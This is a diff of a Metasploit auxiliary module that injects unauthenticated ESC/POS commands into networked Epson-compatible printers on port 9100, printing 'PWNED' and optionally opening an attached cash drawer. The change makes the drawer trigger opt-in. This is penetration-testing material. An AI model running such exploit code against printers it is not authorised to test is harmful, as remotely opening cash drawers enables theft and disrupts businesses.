@@ -9,8 +9,8 @@ class MetasploitModule < Msf::Auxiliary
       'Name'        => 'ESC/POS Printer Command Injector',
       'Description' => %q{
         This module demonstrates an unauthenticated ESC/POS command vulnerability in networked Epson-compatible printers (CVE submitted). 
-        By default, it prints "PWNED" and triggers the attached cash drawer twice.
-        You can override the print message, provide custom hex commands, or choose to skip sending commands for safe testing.
+        By default, it prints "PWNED" (or a custom MESSAGE).
+        You can also optionally trigger the cash drawer.
       },
       'Author'      => ['FutileSkills'],
       'License'     => MSF_LICENSE
@@ -22,7 +22,8 @@ class MetasploitModule < Msf::Auxiliary
         Opt::RPORT(9100),                                  # Default printer port
         OptString.new('MESSAGE', [true, 'Message to print', 'PWNED']),
         OptString.new('HEX_COMMANDS', [false, 'Custom hex commands to send before printing']),
-        OptBool.new('RUN_EXPLOIT', [true, 'Whether to actually send commands to the printer', true])
+        OptBool.new('RUN_EXPLOIT', [true, 'Whether to actually send commands to the printer', true]),
+        OptBool.new('TRIGGER_DRAWER', [false, 'Whether to trigger the attached cash drawer', false])
       ]
     )
   end
@@ -35,6 +36,7 @@ class MetasploitModule < Msf::Auxiliary
     message = datastore['MESSAGE']
     hex_commands = datastore['HEX_COMMANDS']
     run_exploit = datastore['RUN_EXPLOIT']
+    trigger_drawer = datastore['TRIGGER_DRAWER']
 
     if run_exploit
       # Send custom hex commands before default sequence
@@ -59,13 +61,13 @@ class MetasploitModule < Msf::Auxiliary
         sock.put(print_commands)
         disconnect
 
-        sleep(1)
-
-        2.times do
+        # Optionally trigger the drawer
+        if trigger_drawer
+          sleep(1)
           connect
           sock.put(DRAWER_COMMAND)
           disconnect
-          sleep(0.5)
+          print_status("Triggered cash drawer on #{rhost_ip}")
         end
 
         print_good("Finished sending commands to #{rhost_ip}")
